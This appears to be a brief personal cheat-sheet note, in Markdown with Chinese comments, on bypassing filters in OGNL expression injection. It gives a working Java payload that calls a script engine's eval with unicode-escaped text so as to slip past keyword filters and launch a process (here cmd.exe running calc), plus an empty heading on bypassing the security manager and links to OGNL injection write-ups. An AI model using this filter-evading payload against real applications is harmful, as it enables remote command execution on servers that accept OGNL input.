# OGNL bypass
```java
new javax.script.ScriptEngineManager().getEngineByName("js").eval(此处的Payload可以进行unicode编码)

new javax.script.ScriptEngineManager().getEngineByName("js").eval("new j\u0061va.lang.ProcessBuilder['(java.l\u0061ng.String[])'](['cmd.exe','/c','calc']).start()\u003B");

```
## bypass sm
参考 js的bypass
```java

```

>参考
>https://www.sec-in.com/article/753
>https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
